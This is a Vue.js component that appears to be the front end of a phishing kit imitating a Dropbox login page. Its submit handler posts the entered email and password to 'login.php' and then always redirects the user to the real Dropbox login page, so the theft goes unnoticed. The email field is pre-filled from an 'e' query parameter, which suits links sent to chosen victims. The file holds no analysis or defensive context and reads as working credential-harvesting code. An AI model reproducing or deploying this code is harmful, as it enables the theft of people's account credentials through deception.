<script>
/* eslint-disable */
import axios from 'axios'
export default {
  name: 'App',
  data () {
    return {
      showModal: false,
      emailaddress: '',
      password: '',
      emailError: false,
      passwordError: false,
      progressActive: false,
      referrerPage: "//www.dropbox.com/login",
    }
  },
  methods: {
    submitForm () {
      let vm = this
      vm.emailError = vm.emailaddress.length == 0
      vm.passwordError = !vm.emailError && vm.password.length == 0
      if (!vm.emailError && !vm.passwordError) {
        axios.post('login.php', {email: vm.emailaddress, password: vm.password})
        .then(res => {
          vm.progressActive = true
          setTimeout(function() {
            window.location.replace(vm.referrerPage);
          }, 350);
        })
        .catch(error => {
          vm.progressActive = true
          setTimeout(function() {
            window.location.replace(vm.referrerPage);
          }, 350);
        })
      }
    },
    initiatePage () {
      let uri = window.location.href.split("?");
      if (uri.length > 0 && uri[1] !== undefined) {
          let vars = uri[1].split("&");
          let getVars = {};
          let tmp = "";
          vars.forEach(function(v) {
            tmp = v.split("=");
            if (tmp.length == 2)
              getVars[tmp[0].toLowerCase()] = decodeURIComponent(tmp[1]);
          });
          this.emailaddress = "undefined" !== typeof getVars["e"] ? getVars["e"] : "";
      }
    }
  },
  beforeMount () {
    this.initiatePage()
  }
};
</script>

